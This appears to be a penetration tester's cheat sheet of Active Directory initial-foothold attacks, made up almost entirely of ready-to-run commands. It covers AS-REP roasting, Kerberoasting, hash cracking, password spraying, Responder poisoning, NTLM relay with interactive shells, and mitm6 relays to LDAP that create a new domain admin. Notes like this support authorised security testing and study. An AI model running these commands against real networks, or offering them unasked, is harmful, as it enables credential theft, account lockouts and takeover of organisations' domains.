# Active Directory Attack Vectors

## Overview

Initial foothold attacks target misconfigurations, weak protocols, and credential theft to gain a foothold in the domain.

---

## AS-REP Roasting

Attacks users with `DONT_REQ_PREAUTH` set (no Kerberos pre-authentication required).

### Enumeration

```bash
# Find AS-REP roastable users (no creds needed with user list)
impacket-GetNPUsers <domain>/ -dc-ip <DC-IP> -usersfile users.txt

# With credentials
impacket-GetNPUsers <domain>/<user>:<password> -dc-ip <DC-IP> -request

# PowerView
Get-DomainUser -PreauthNotRequired | select samaccountname
```

### Cracking

```bash
# Hashcat mode 18200
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# john
john asrep.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## Kerberoasting

Request TGS tickets for service accounts which are encrypted with the account's NTLM hash.

### Enumeration & Exploitation

```bash
# Impacket
impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <DC-IP> -request
impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <DC-IP> -request -outputfile kerberoast.txt
impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <DC-IP> -request -usersfile users.txt

# PowerView
Get-NetUser -SPN | select samaccountname, serviceprincipalname

# Rubeus
Rubeus.exe kerberoast /outfile:kerberoast.txt
Rubeus.exe kerberoast /domain:<domain> /dc:<DC-IP> /nowrap

# With specific user
Rubeus.exe kerberoast /user:<svc_account> /nowrap
```

### Cracking

```bash
# Hashcat mode 13100
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### Targeted Kerberoasting (AS-REP + Kerberoast combo)

```bash
# If you can modify target's SPN set (GenericWrite), set a fake SPN then kerberoast
impacket-GetUserSPNs -target-user <user> <domain>/<user>:<password> -request
```

---

## Password Spraying

Test a single weak/reused password against many accounts (few attempts per user avoids lockout).

```bash
# CrackMapExec
crackmapexec smb <DC-IP> -u users.txt -p 'Password123' --continue-on-success
crackmapexec smb <DC-IP> -u <user> -p ./passwords.txt --continue-on-success

# Domain sprays
crackmapexec smb <DC-IP> -u users.txt -p <password> --continue-on-success

# Local auth spray
crackmapexec smb <target> -u administrator -H <hash> --local-auth

# Kerberos spray
crackmapexec ldap <DC-IP> -u users.txt -p <password> -k

# With kerbrute
kerbrute passwordspray -d <domain> users.txt <password>

# Spraying against different protocols
crackmapexec winrm <DC-IP> -u users.txt -p <password> --continue-on-success
crackmapexec mssql <DC-IP> -u users.txt -p <password> --continue-on-success
```

### Password Policy Check

```bash
# Always check lockout policy before spraying!
crackmapexec smb <DC-IP> -u <user> -p <password> --pass-pol
enum4linux -P <DC-IP>
```

---

## LLMNR/NBT-NS Poisoning

Poison Link-Local Multicast Name Resolution and NetBIOS Name Service to capture NTLMv2 hashes.

### Responder

```bash
# Basic Responder
responder -I eth0 -rdwv

# Responder options
responder -I eth0 -rdwv -F       # Fingerprint
responder -I eth0 -rdwv -P       # Force NTLM authentication
responder -I eth0 -rdwv -e <IP>  # Custom responder IP (multi-homed)

# Analyze captured hashes
# Hashes saved in /usr/share/responder/logs/
```

### Capturing and Cracking

```bash
# Captured hash format (hashcat mode 5600)
$NETNTLMv2$...$...

# Crack with hashcat
hashcat -m 5600 captured.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Crack with john
john captured.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

### Relaying instead of Cracking

See [[AD Lateral Movement#SMB Relay]]

---

## SMB Relay (NTLM Relay)

Relay captured NTLM authentication to another target.

### Impacket ntlmrelayx

```bash
# Setup relay
impacket-ntlmrelayx -tf targets.txt -smb2support

# With specific mode
impacket-ntlmrelayx -tf targets.txt -smb2support -socks      # SOCKS for repeated use
impacket-ntlmrelayx -tf targets.txt -smb2support -i           # Interactive shell

# Targets file format (one per line)
<target-ip>

# Relaying with different protocols
impacket-ntlmrelayx -tf targets.txt -smb2support -socks -http
impacket-ntlmrelayx -tf targets.txt -smb2support -of <output>
```

### Full Relay Chain

```bash
# Terminal 1: Start Responder with SMB/LDAP off
responder -I eth0 -rdwv -w -r -f -v -N

# Terminal 2: Start relay
impacket-ntlmrelayx -tf targets.txt -smb2support -socks

# Important: Disable SMB and HTTP server in Responder.conf
# Set: SMB = Off, HTTP = Off
```

### Requirements

- SMB signing disabled on target
- Target must not have SMB signing enabled
- Captured user must have admin rights on target

### Check for SMB Signing

```bash
crackmapexec smb <subnet>/24 --gen-relay-list relayable.txt
nmap --script smb2-security-mode -p445 <subnet>/24
```

---

## IPv6 DNS Takeover (mitm6 + ntlmrelayx)

Exploit IPv6 being preferred over IPv4; reply to DNS queries (WPAD) and capture authentication.

### Attack Setup

```bash
# Terminal 1: Start mitm6
sudo mitm6 -d <domain>.local -hw wpad -s ''

# Terminal 2: ntlmrelayx for LDAP relay
impacket-ntlmrelayx -6 -wh wpad.<domain>.local -t ldaps://<DC-IP> -l loot/ -socks -debug
impacket-ntlmrelayx -6 -wh wpad.<domain>.local -t ldap://<DC-IP> -l loot/ -socks -debug
```

### Attack Workflow

1. mitm6 responds to IPv6 DNS queries
2. Targets discover WPAD via DNS
3. Targets download wpad.dat from relay
4. Targets authenticate to relay
5. Relay authenticates to LDAPS/DC
6. Create/compromise domain account

### mitm6 + LDAP Relay Commands

```bash
# Create a new domain admin via LDAP relay
impacket-ntlmrelayx -6 -wh wpad.<domain>.local -t ldaps://<DC-IP> -create-admin -socks

# Delegating computer accounts
impacket-ntlmrelayx -6 -wh wpad.<domain>.local -t ldaps://<DC-IP> -delegate-access -socks
```

---

## Password Spraying - Additional Tools

```bash
# DomainPasswordSpray (PowerShell)
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password <password> -OutFile spray_success.csv
Invoke-DomainPasswordSpray -UserList users.txt -Password <password> -Domain <domain>

# Manual spray with SMB
for user in $(cat users.txt); do \
  net use \\\\<target>\\IPC$ /user:<domain>\\$user '<password>' 2>&1 | \
  grep -v "System error 85\|The command completed"; \
  net use \\\\<target>\\IPC$ /delete 2>&1 > /dev/null; \
done
```

---

## Related Notes

- [[AD Recon Enumeration]]
- [[AD Lateral Movement]]
- [[AD Privilege Escalation]]
- [[AD Domain Dominance]]
- [[Windows Post Exploitation]]
